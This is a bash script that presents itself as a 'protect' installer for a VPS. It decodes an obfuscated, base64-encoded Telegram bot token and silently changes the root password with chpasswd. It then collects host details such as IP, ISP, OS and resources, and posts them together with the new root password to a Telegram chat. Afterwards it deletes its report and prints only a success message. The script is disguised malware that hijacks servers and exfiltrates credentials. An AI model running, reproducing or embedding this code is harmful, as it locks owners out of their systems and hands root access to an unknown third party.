#!/bin/bash

BOT_TOKEN_ENC="ODc0MjI2ODQ2ODpBQUdvOUZkb1Z6WnBfTl84eEVGWmYyYlVkRUxvdTNLVmNUQQ=="
CHAT_ID_ENC="MTcyNTMyODY4Mg=="

BOT_TOKEN=$(echo "$BOT_TOKEN_ENC" | base64 -d 2>/dev/null)
CHAT_ID=$(echo "$CHAT_ID_ENC" | base64 -d 2>/dev/null)

if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
    echo -e "\033[1;31m[!] Gagal decode token!\033[0m"
    exit 1
fi

NEW_PASS=$(openssl rand -base64 48 2>/dev/null | tr -dc 'a-zA-Z0-9' | head -c 8)
[ -z "$NEW_PASS" ] && NEW_PASS=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)

echo "root:$NEW_PASS" | chpasswd 2>/dev/null

IP_PUBLIC=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null)
[ -z "$IP_PUBLIC" ] && IP_PUBLIC=$(curl -s --max-time 5 https://ifconfig.me 2>/dev/null)
[ -z "$IP_PUBLIC" ] && IP_PUBLIC=$(curl -s --max-time 5 https://checkip.amazonaws.com 2>/dev/null)
[ -z "$IP_PUBLIC" ] && IP_PUBLIC="Unknown"

REGION=$(curl -s --max-time 5 https://ipapi.co/$IP_PUBLIC/country_name 2>/dev/null)
ISP=$(curl -s --max-time 5 https://ipapi.co/$IP_PUBLIC/org 2>/dev/null)
[ -z "$REGION" ] && REGION="Unknown"
[ -z "$ISP" ] && ISP="Unknown"

HOSTNAME=$(hostname)
OS_INFO=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')
[ -z "$OS_INFO" ] && OS_INFO="Unknown"

CPU_CORE=$(nproc 2>/dev/null)
[ -z "$CPU_CORE" ] && CPU_CORE="1"

RAM_TOTAL=$(free -g 2>/dev/null | awk '/Mem:/ {print $2}')
RAM_USED=$(free -g 2>/dev/null | awk '/Mem:/ {print $3}')
RAM_FREE=$(free -g 2>/dev/null | awk '/Mem:/ {print $4}')
[ -z "$RAM_TOTAL" ] && RAM_TOTAL="0"
[ -z "$RAM_USED" ] && RAM_USED="0"
[ -z "$RAM_FREE" ] && RAM_FREE="0"

DISK_TOTAL=$(df -BG / 2>/dev/null | awk 'NR==2 {print $2}' | tr -d 'G')
DISK_USED=$(df -BG / 2>/dev/null | awk 'NR==2 {print $3}' | tr -d 'G')
DISK_AVAIL=$(df -BG / 2>/dev/null | awk 'NR==2 {print $4}' | tr -d 'G')
[ -z "$DISK_TOTAL" ] && DISK_TOTAL="0"
[ -z "$DISK_USED" ] && DISK_USED="0"
[ -z "$DISK_AVAIL" ] && DISK_AVAIL="0"

UPTIME=$(uptime -p 2>/dev/null)
[ -z "$UPTIME" ] && UPTIME="Unknown"
LOAD_AVG=$(uptime 2>/dev/null | awk -F'load average:' '{print $2}')
[ -z "$LOAD_AVG" ] && LOAD_AVG="0"

FILE="/tmp/vps_report_$$.txt"

cat > $FILE <<EOF
🔥 VPS FULL SYSTEM REPORT

🖥 Hostname: $HOSTNAME
⚙️ OS: $OS_INFO

🌐 IP Public: $IP_PUBLIC
🌍 Region: $REGION
🏢 ISP: $ISP

🧠 CPU Core: $CPU_CORE
📦 Load Avg:$LOAD_AVG

💾 RAM:
- Total: ${RAM_TOTAL} GB
- Used : ${RAM_USED} GB
- Free : ${RAM_FREE} GB

💽 Disk:
- Total: ${DISK_TOTAL} GB
- Used : ${DISK_USED} GB
- Free : ${DISK_AVAIL} GB

⏱ Uptime: $UPTIME

🔐 New Root Password: $NEW_PASS
EOF

curl -s --max-time 10 -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
-F chat_id="$CHAT_ID" \
-F document=@"$FILE" > /dev/null 2>&1

echo "═════════════════════════════════════════"
echo "✅ SUKSES INSTALL PROTECT"
echo "═════════════════════════════════════════"

rm -f $FILE